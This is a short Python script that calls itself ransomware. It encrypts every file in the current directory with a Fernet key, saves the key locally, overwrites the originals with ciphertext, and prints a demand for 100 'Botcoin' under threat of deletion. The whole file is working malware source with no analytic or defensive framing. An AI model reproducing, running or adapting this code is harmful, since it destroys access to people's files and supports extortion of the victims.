#!/usr/bin/env python3


import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "Ransomeware.py" or file == "Decrypt.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

for file in files :
    with open(file,"rb") as thefile:
        contents = thefile.read()        
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypt)


print("All of your  files have been encrypted !! send me 100 Botcoin or I'll delete them in 24 hour")
